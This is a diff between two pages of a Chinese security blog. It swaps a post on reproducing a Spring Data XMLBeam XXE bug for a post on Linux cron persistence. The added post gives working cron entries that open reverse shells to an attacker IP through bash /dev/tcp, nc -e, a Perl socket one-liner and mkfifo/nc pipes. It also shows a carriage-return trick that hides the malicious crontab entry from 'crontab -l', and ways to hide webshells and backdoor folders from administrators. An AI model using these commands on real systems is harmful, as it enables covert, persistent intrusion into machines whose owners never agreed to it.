@@ -22,7 +22,7 @@
     <meta name="description" content="纯净水@流云-自留地">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>XXE实例及应用3 · 纯净水@流云</title>
+    <title>计划任务 · 纯净水@流云</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >凡心所向，素履所往</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">XXE实例及应用3</a>
+                <a href="#" class="post-name">计划任务</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            XXE实例及应用3
+            计划任务
             <!-- 404 -->
             
         </h1>
@@ -266,22 +266,20 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Web渗透">Web渗透</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "内网渗透">内网渗透</a>
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "XXE">XXE</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞学习">漏洞学习</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "计划任务">计划任务</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">572</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.6k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/07/08</span>
+                    <span class="post-intro-time">2019/07/11</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -405,57 +403,110 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>Java - XXE</p>
-<h1 id="Java-XXE"><a href="#Java-XXE" class="headerlink" title="Java - XXE"></a>Java - XXE</h1><p>XXE在Java 代码中的漏洞示例</p>
-<h2 id="JAVA常见XXE漏洞写法案例"><a href="#JAVA常见XXE漏洞写法案例" class="headerlink" title="JAVA常见XXE漏洞写法案例"></a>JAVA常见XXE漏洞写法案例</h2><h3 id="spring-data-XMLBean-XXE复现分析"><a href="#spring-data-XMLBean-XXE复现分析" class="headerlink" title="spring-data-XMLBean XXE复现分析"></a>spring-data-XMLBean XXE复现分析</h3><h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><p>【1】下载环境</p>
-<pre><code>git clone https://github.com/spring-projects/spring-data-examples.git
-</code></pre><p>【2】下载安装maven并配置好环境变量<br>因为这里的新版本已经对次做了修复，所以这里的版本改为 2.0.5</p>
-<pre><code>        &lt;dependency&gt;
-            &lt;groupId&gt;org.springframework.data&lt;/groupId&gt;
-            &lt;artifactId&gt;spring-data-commons&lt;/artifactId&gt;
-            &lt;version&gt;2.0.5.RELEASE&lt;/version&gt;
-        &lt;/dependency&gt;
-</code></pre><p>【3】配置好环境变量后，进入对应的web/projection 打包运行</p>
-<pre><code>mvn package
-</code></pre><p><img src="/posts/384491153/XXE实例及应用3/15613639506348.jpg" alt="-w1133"></p>
-<h4 id="部署运行"><a href="#部署运行" class="headerlink" title="部署运行"></a>部署运行</h4><p>进入对应目录搭建运行</p>
-<pre><code>java -jar spring-data-web-projection-2.0.0.BUILD-SNAPSHOT.jar
-</code></pre><p><img src="/posts/384491153/XXE实例及应用3/15613640157733.jpg" alt="-w754"></p>
-<h4 id="poc复现"><a href="#poc复现" class="headerlink" title="poc复现"></a>poc复现</h4><p>构造post请求<br><img src="/posts/384491153/XXE实例及应用3/15613640647871.jpg" alt="-w1318"><br>比较奇怪的一点是，正常的xxe请求 任意文件读取 都应该是 file:///<br>这里直接执行也行<br><img src="/posts/384491153/XXE实例及应用3/15613641950150.jpg" alt="-w1094"></p>
-<pre><code>
-注意  这里的content-type 类型，得支持，改为 application/xml
-</code></pre><p>xxe支持的content-type fuzz一下<br>在位置中application/xhtml+xml 与 application/xml 的效果是一样的<br><img src="/posts/384491153/XXE实例及应用3/15613841433359.jpg" alt="-w1016"></p>
-<pre><code>注
-Accept代表发送端（客户端）希望接受的数据类型。 
-比如：Accept：text/xml; 
-代表客户端希望接受的数据类型是xml类型
+        <p>计划任务<br>[TOC]</p>
+<h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><p>linux 计划任务 结合 NC执行后门</p>
+<h2 id="查看crontab执行情况"><a href="#查看crontab执行情况" class="headerlink" title="查看crontab执行情况"></a>查看crontab执行情况</h2><p>查看其日志的方式</p>
+<pre><code>tail -f /var/log/cron 
+</code></pre><h2 id="crontab-命令"><a href="#crontab-命令" class="headerlink" title="crontab 命令"></a>crontab 命令</h2><pre><code>Usage:
+ crontab [options] file
+ crontab [options]
+ crontab -n [hostname]
 
-Content-Type代表发送端（客户端|服务器）发送的实体数据的数据类型。 
-比如：Content-Type：text/html; 
-代表发送端发送的数据格式是html。
-</code></pre><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>从该位置可以知道漏洞位置是在 firstname和lastname的接收处理，所以跟踪下idea下的该函数。<br><img src="/posts/384491153/XXE实例及应用3/15613896457891.jpg" alt="-w1283"><br>该maven项目demo中就application和userController 两个函数，从主函数跟踪。<br><img src="/posts/384491153/XXE实例及应用3/15613906870820.jpg" alt="-w911"><br>可以看到post请求中的user.getFirstname(),user.getLastname() 方法<br><img src="/posts/384491153/XXE实例及应用3/15613907763911.jpg" alt="-w404"><br><img src="/posts/384491153/XXE实例及应用3/15613909426094.jpg" alt="-w805"><br><img src="/posts/384491153/XXE实例及应用3/15613909700427.jpg" alt="-w881"></p>
-<p>跟踪下 会发现，在调用responseEntity的时候就已经读取文件了<br><img src="/posts/384491153/XXE实例及应用3/15614750470756.jpg" alt="-w932"><br><img src="/posts/384491153/XXE实例及应用3/15614751204095.jpg" alt="-w943"></p>
-<p>参考网上的分析，漏洞的处理函数位是在org.xmlbeam.ProjectionInvocationHandler:invokeReadProjection()处理<br><img src="/posts/384491153/XXE实例及应用3/15614773758537.jpg" alt="-w913"></p>
-<p>顺带在这里看下相对路径处理成功的原因</p>
-<h2 id="待补充细分"><a href="#待补充细分" class="headerlink" title="待补充细分"></a>待补充细分</h2><p>  在提交http/post请求后，跟踪下</p>
-<pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> Object readWithMessageConverters
-</code></pre>
-<p>在对该post参数进行处理时，这里还没进行文件读取转换<br><img src="/posts/384491153/XXE实例及应用3/15618975324384.jpg" alt="-w900"><br><img src="/posts/384491153/XXE实例及应用3/15618981734937.jpg" alt="-w1184"><br><img src="/posts/384491153/XXE实例及应用3/15618983029402.jpg" alt="-w1144"><br><img src="/posts/384491153/XXE实例及应用3/15618991907073.jpg" alt="-w1425"><br><img src="/posts/384491153/XXE实例及应用3/15618992335070.jpg" alt="-w704"></p>
-<p>漏洞原因是在于XMLBeam漏洞版本中没有限制外部实体<br><img src="/posts/384491153/XXE实例及应用3/15619003084333.jpg" alt="-w701"></p>
-<p><img src="/posts/384491153/XXE实例及应用3/15619002278361.jpg" alt="-w771"></p>
-<p><img src="/posts/384491153/XXE实例及应用3/15619001968741.jpg" alt="-w810"></p>
-<p><img src="/posts/384491153/XXE实例及应用3/15619001679940.jpg" alt="-w805"></p>
-<p><img src="/posts/384491153/XXE实例及应用3/15619001256468.jpg" alt="-w915"></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.spoock.com/2018/10/23/java-xxe/" target="_blank" rel="noopener">JAVA常见的XXE漏洞写法和防御</a><br><a href="https://blog.spoock.com/2018/05/16/cve-2018-1259/" target="_blank" rel="noopener">spring-data-XMLBean XXE复现分析</a><br><a href="https://xz.aliyun.com/t/2341" target="_blank" rel="noopener">XXE with Spring Data’s XMLBeam 分析</a><br><a href="https://www.cnblogs.com/Qian123/p/5256084.html" target="_blank" rel="noopener">框架基础——全面解析Java注解</a></p>
+Options:
+ -u &lt;user&gt;  define user
+ -e         edit user&#39;s crontab
+ -l         list user&#39;s crontab
+ -r         delete user&#39;s crontab
+ -i         prompt before deleting
+ -n &lt;host&gt;  set host in cluster to run users&#39; crontabs
+ -c         get host in cluster to run users&#39; crontabs
+ -s         selinux context
+ -x &lt;mask&gt;  enable debugging
+
+Default operation is replace, per 1003.2
+</code></pre><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><pre><code>[root@VM_0_2_centos ~]# cat /etc/crontab
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+</code></pre><p>配置文件为/etc/crontab<br>存放执行的crontab脚本文件的路径为/etc/cron.d<br>存放每个用户的crontab任务的目录在debian系统中一般为/var/spool/cron/crontabs，centos系统中一般为/var/spool/cron<br><img src="/posts/3083871992/15624920243890.jpg" alt="-w293"></p>
+<h2 id="利用crontab-反弹shell"><a href="#利用crontab-反弹shell" class="headerlink" title="利用crontab 反弹shell"></a>利用crontab 反弹shell</h2><p>常见的通过corntab反弹shell方法</p>
+<h3 id="bash-反弹shell"><a href="#bash-反弹shell" class="headerlink" title="bash 反弹shell"></a>bash 反弹shell</h3><p>测试设备<br>A：服务端 centos<br>B：客户端 ubuntu</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1
+</code></pre><h4 id="命令解析"><a href="#命令解析" class="headerlink" title="命令解析"></a>命令解析</h4><pre><code>参数    描述
+-c string    从string中读取命令并处理他们
+-r     启动限制性shell,限制用户在默认目录下活动
+-i    启动交互性shell,允许用户输入
+-s    从标准输入读取命令
+</code></pre><p>即启用交互式shell</p>
+<pre><code>linux shell下常用的文件描述符是：
+1.  标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； 
+2.  标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； 
+3.  标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;
+</code></pre><p>其中 “&gt;&amp;” 和 “&amp;&gt;”的效果一样都是将标准错误输出重定向到标准输出，即和”&gt; xxx 2&gt;&amp;1”是一样的。<br>这里的”&amp;”  类似于取地址符<br><img src="/posts/3083871992/15624937292291.jpg" alt="-w1435"><br>此处 客户端的输入和输出都在服务端上展示，服务端无法直接输入<br><img src="/posts/3083871992/15624942091590.jpg" alt="-w1438"></p>
+<p>在man bash 里面解释为<br><img src="/posts/3083871992/15624986811057.jpg" alt="-w709"><br>同理   “n&lt;&amp;word” 是word复制给n， “n&gt;&amp;word”是把word复制给n<br>“0&gt;&amp;1”就是把 0对应的设备改成的1对应的设备，那也就是socket。这就表明了 stdin就是从socket中读取数据，然后再执行命令，把bash的命令行返回内容通过stdout发到socket。<br><img src="/posts/3083871992/15624989415170.jpg" alt="-w712"></p>
+<p>/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/</p>
+<h3 id="crontab-反弹-shell"><a href="#crontab-反弹-shell" class="headerlink" title="crontab 反弹 shell"></a>crontab 反弹 shell</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><p>crontab -e<br>选择常见编辑器后，写入执行命令</p>
+<pre><code>*/1 * * * * bash -i &amp;&gt; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1
+*/1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1
+</code></pre><p>以及段师傅的</p>
+<pre><code>/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39;
+</code></pre><p>别忘了重启</p>
+<pre><code>/etc/init.d/cron restart
+</code></pre><p>在ubuntu中 踩了个大坑，这条命令在centos中可以执行，但是在ubuntu中不行。<br>检查日志 “/var/log/syslog” 发现计划任务执行了，但是结果没建立连接<br><img src="/posts/3083871992/15625034967756.jpg" alt="-w888"><br><img src="/posts/3083871992/15625035284231.jpg" alt="-w887"></p>
+<p>修改下软连接</p>
+<pre><code>ln -sf bash /bin/sh
+</code></pre><p><img src="/posts/3083871992/15625045861245.jpg" alt="-w533"></p>
+<p><img src="/posts/3083871992/15625054790101.jpg" alt="-w530"><br><img src="/posts/3083871992/15625062607262.jpg" alt="-w1300"></p>
+<p>推测是原ubuntu 版本的bin/sh 软连接 连接到dash<br>修改后的软连接：<br><img src="/posts/3083871992/15625069478372.jpg" alt="-w653"><br>这里/bin/sh软连接是sh -&gt; dash 然后rbash -&gt; bash<br>关键问题是 bash和dash的区别</p>
+<pre><code>从Ubuntu 6.10开始，默认使用dash(theDebian Almquist Shell)而不是bash(the GNUBourne-Again Shell). 但Login Shell还是bash. 原因是dash更快、更高效，而且它符合POSIX规范。Ubuntu在启动的时候会运行很多shell脚本，使用dash可以加快启动速度
+</code></pre><h4 id="bash和dash在-bin-sh-使用中的区别-待续"><a href="#bash和dash在-bin-sh-使用中的区别-待续" class="headerlink" title="bash和dash在/bin/sh  使用中的区别-待续"></a>bash和dash在/bin/sh  使用中的区别-待续</h4><p>将该ubuntu中的/bin/sh 软连接改回到dash，查看该问题报错</p>
+<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>在centos下可以使用</p>
+<pre><code>*/1 * * * * nc -e /bin/sh ip port
+</code></pre><p>别忘了重启</p>
+<pre><code>service crond restart
+</code></pre><p><img src="/posts/3083871992/15625077559555.jpg" alt="-w892"></p>
+<pre><code>*/1 * * * * perl -e &#39;use Socket;$i=&quot;vps.ip&quot;;$p=8989;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
+</code></pre><h1 id="隐藏计划任务"><a href="#隐藏计划任务" class="headerlink" title="隐藏计划任务"></a>隐藏计划任务</h1><p>在使用计划任务入侵的时候，可以简单的隐藏下计划任务，以便于不那么容易被发现</p>
+<pre><code>(crontab -l;printf &quot;*/1 * * * *  /usr/bin/nc ip 8550 -e /bin/sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -
+</code></pre><p>这个时候直接用crontab -l 输出的时候是直接显示no crontab for 当前用户。</p>
+<p>注意这里有一个坑点，osx系统中的nc 没有-e 参数（在Linux的大部分发行版中都默认编译了nc，但也许是出于安全考虑，发行版中默认编译的nc往往没有-e选项(没有define一个<br>GAPING_SECURITY_HOLE常量)，也就是说我们不能通过-e选项绑定目标的shell，使得我们在利用上受到限制，但这种情况下是不是就），这里可以看看mail文件”/var/mail/name”里面的报错<br><img src="/posts/3083871992/15626424045783.jpg" alt="-w657"></p>
+<h2 id="nc-缺少-e-参数的解决方式"><a href="#nc-缺少-e-参数的解决方式" class="headerlink" title="nc 缺少 -e 参数的解决方式"></a>nc 缺少 -e 参数的解决方式</h2><h3 id="dev-tcp"><a href="#dev-tcp" class="headerlink" title="dev/tcp"></a>dev/tcp</h3><p>在缺少 -e得时候，可以使用bash dev/tcp/ip/port（在有/dev/tcp的bash的前提下）<br><img src="/posts/3083871992/15631095532134.jpg" alt="-w563"></p>
+<p><img src="/posts/3083871992/15631095859841.jpg" alt="-w1112"></p>
+<h3 id="mknod-FIFO"><a href="#mknod-FIFO" class="headerlink" title="mknod FIFO"></a>mknod FIFO</h3><pre><code>mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f
+</code></pre><p><img src="/posts/3083871992/15631099611608.jpg" alt="-w1122"><br>mkfifo</p>
+<p>或者</p>
+<pre><code>mknod /tmp/backpipe p ;/bin/sh 0&lt; /tmp/backpipe | nc ip 443 1&gt; /tmp/backpipe
+</code></pre><p><img src="/posts/3083871992/15631105445990.jpg" alt="-w1136"></p>
+<h2 id="隐藏文件-文件夹"><a href="#隐藏文件-文件夹" class="headerlink" title="隐藏文件/文件夹"></a>隐藏文件/文件夹</h2><p>Linux/Unix 藏文件和文件夹<br>Linux/Unix 下想藏 Webshell 或者后门什么的，可以利用一下隐藏文件夹和文件。</p>
+<p>方法一<br>比如创建一个名字开头带 . 的 Webshell 或者文件夹，默认情况下是不会显示出来的，浏览器访问的时候加点访问就行。（查看方法：ls -a）</p>
+<pre><code>touch .webshell.php 创建名字为 .webshell.php 的文件
+mkdir .backdoor/ 创建名字为 .backdoor 的文件夹
+</code></pre><p>终极方法<br>在管理员喝多了或者脑子转不过来的情况下，是绝对不会发现的！至少我用了这么久是没几个发现的。<br>是文件的话浏览器访问直接输 … 就行，目录同理。</p>
+<pre><code>touch … 创建名字为 … 的文件
+mkdir … 创建名字为 … 的文件夹
+
+</code></pre><h2 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h2><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>  <a href="https://m3lon.github.io/2019/03/18/解决ubuntu-crontab反弹shell失败的问题/" target="_blank" rel="noopener">解决ubuntu-crontab反弹shell失败的问题</a></p>
+<p>   <a href="https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/" target="_blank" rel="noopener">Netcat without -e? No Problem!</a></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="https://blog.th3wind.xyz">th3wind</a>
-            <p>原文链接：<a href="https://blog.th3wind.xyz/posts/384491153/">https://blog.th3wind.xyz/posts/384491153/</a>
-            <p>发表日期：<a href="https://blog.th3wind.xyz/posts/384491153/">July 8th 2019, 10:00:00 pm</a>
-            <p>更新日期：<a href="https://blog.th3wind.xyz/posts/384491153/">February 5th 2020, 12:50:18 am</a>
+            <p>原文链接：<a href="https://blog.th3wind.xyz/posts/3083871992.html">https://blog.th3wind.xyz/posts/3083871992.html</a>
+            <p>发表日期：<a href="https://blog.th3wind.xyz/posts/3083871992.html">July 11th 2019, 10:00:00 pm</a>
+            <p>更新日期：<a href="https://blog.th3wind.xyz/posts/3083871992.html">February 5th 2020, 12:50:18 am</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -464,16 +515,16 @@ Content-Type代表发送端（客户端|服务器）发送的实体数据的数�
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/posts/3083871992/" title= "计划任务">
-                    <div class="nextTitle">计划任务</div>
+                <a href= "/posts/1479992369.html" title= "fastjson 1.2.47 rce">
+                    <div class="nextTitle">fastjson 1.2.47 rce</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/posts/0/" title= "">
-                    <div class="prevTitle">[Untitled Post]</div>
+                <a href= "/posts/384491153.html" title= "XXE实例及应用3">
+                    <div class="prevTitle">XXE实例及应用3</div>
                 </a>
             
         </li>
@@ -592,7 +643,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-XXE"><span class="toc-number">1.</span> <span class="toc-text">Java - XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA常见XXE漏洞写法案例"><span class="toc-number">1.1.</span> <span class="toc-text">JAVA常见XXE漏洞写法案例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#spring-data-XMLBean-XXE复现分析"><span class="toc-number">1.1.1.</span> <span class="toc-text">spring-data-XMLBean XXE复现分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#搭建环境"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">搭建环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#部署运行"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">部署运行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#poc复现"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">poc复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#待补充细分"><span class="toc-number">1.2.</span> <span class="toc-text">待补充细分</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">2.</span> <span class="toc-text">参考</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#计划任务"><span class="toc-number">1.</span> <span class="toc-text">计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看crontab执行情况"><span class="toc-number">1.1.</span> <span class="toc-text">查看crontab执行情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crontab-命令"><span class="toc-number">1.2.</span> <span class="toc-text">crontab 命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#配置文件"><span class="toc-number">1.2.1.</span> <span class="toc-text">配置文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用crontab-反弹shell"><span class="toc-number">1.3.</span> <span class="toc-text">利用crontab 反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash-反弹shell"><span class="toc-number">1.3.1.</span> <span class="toc-text">bash 反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#命令解析"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">命令解析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crontab-反弹-shell"><span class="toc-number">1.3.2.</span> <span class="toc-text">crontab 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bash"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">bash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bash和dash在-bin-sh-使用中的区别-待续"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">bash和dash在/bin/sh  使用中的区别-待续</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nc"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">nc</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#隐藏计划任务"><span class="toc-number">2.</span> <span class="toc-text">隐藏计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nc-缺少-e-参数的解决方式"><span class="toc-number">2.1.</span> <span class="toc-text">nc 缺少 -e 参数的解决方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dev-tcp"><span class="toc-number">2.1.1.</span> <span class="toc-text">dev/tcp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mknod-FIFO"><span class="toc-number">2.1.2.</span> <span class="toc-text">mknod FIFO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#隐藏文件-文件夹"><span class="toc-number">2.2.</span> <span class="toc-text">隐藏文件/文件夹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#隐藏"><span class="toc-number">2.3.</span> <span class="toc-text">隐藏</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -760,12 +811,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/13</span><a class="archive-post-title" href= "/posts/238052750/" >java反弹shell</a>
+            <span class="archive-post-date">01/13</span><a class="archive-post-title" href= "/posts/2306483136.html" >jackson反序列化漏洞_1</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/13</span><a class="archive-post-title" href= "/posts/2306483136/" >jackson反序列化漏洞_1</a>
+            <span class="archive-post-date">01/13</span><a class="archive-post-title" href= "/posts/238052750.html" >java反弹shell</a>
         </li>
     
     
@@ -779,17 +830,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/13</span><a class="archive-post-title" href= "/posts/4232223630/" >java sql注入</a>
+            <span class="archive-post-date">12/13</span><a class="archive-post-title" href= "/posts/4232223630.html" >java sql注入</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/08</span><a class="archive-post-title" href= "/posts/1199978306/" >Apache Solr CVE-2019-0193 复现与学习</a>
+            <span class="archive-post-date">09/08</span><a class="archive-post-title" href= "/posts/1199978306.html" >Apache Solr CVE-2019-0193 复现与学习</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/28</span><a class="archive-post-title" href= "/posts/441860727/" >fastjson 反序列化（二）</a>
+            <span class="archive-post-date">07/28</span><a class="archive-post-title" href= "/posts/441860727.html" >fastjson 反序列化（二）</a>
         </li>
     
     
@@ -803,7 +854,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/posts/799045951/" >json与jsonp的学习与分析</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/posts/799045951.html" >json与jsonp的学习与分析</a>
         </li>
     
     
@@ -817,22 +868,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/21</span><a class="archive-post-title" href= "/posts/1832779944/" >DOM XSS从javascript中输出数据到HTML页面</a>
+            <span class="archive-post-date">07/21</span><a class="archive-post-title" href= "/posts/1832779944.html" >DOM XSS从javascript中输出数据到HTML页面</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/18</span><a class="archive-post-title" href= "/posts/1479992369/" >fastjson 1.2.47 rce</a>
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href= "/posts/1479992369.html" >fastjson 1.2.47 rce</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/11</span><a class="archive-post-title" href= "/posts/3083871992/" >计划任务</a>
+            <span class="archive-post-date">07/11</span><a class="archive-post-title" href= "/posts/3083871992.html" >计划任务</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/08</span><a class="archive-post-title" href= "/posts/384491153/" >XXE实例及应用3</a>
+            <span class="archive-post-date">07/08</span><a class="archive-post-title" href= "/posts/384491153.html" >XXE实例及应用3</a>
         </li>
     
     
@@ -846,7 +897,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/posts/0/" >[Untitled Post]</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/posts/0.html" >[Untitled Post]</a>
         </li>
     
     
@@ -860,27 +911,27 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/posts/577137578/" >ETH 漏洞复现</a>
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/posts/577137578.html" >ETH 漏洞复现</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/28</span><a class="archive-post-title" href= "/posts/608224058/" >XXE 示例及利用-java—SDK-1</a>
+            <span class="archive-post-date">01/28</span><a class="archive-post-title" href= "/posts/608224058.html" >XXE 示例及利用-java—SDK-1</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/posts/3609640977/" >frida理解与学习</a>
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/posts/3609640977.html" >frida理解与学习</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/10</span><a class="archive-post-title" href= "/posts/1469573512/" >安全策略-csp理解与学习</a>
+            <span class="archive-post-date">01/10</span><a class="archive-post-title" href= "/posts/1469573512.html" >安全策略-csp理解与学习</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/posts/3327493404/" >2019</a>
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/posts/3327493404.html" >2019</a>
         </li>
     
     
@@ -894,17 +945,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/posts/4121068354/" >XXE 示例及利用</a>
+            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/posts/4121068354.html" >XXE 示例及利用</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/02</span><a class="archive-post-title" href= "/posts/3586992485/" >编码绕过xss</a>
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href= "/posts/3586992485.html" >编码绕过xss</a>
         </li>
     
     
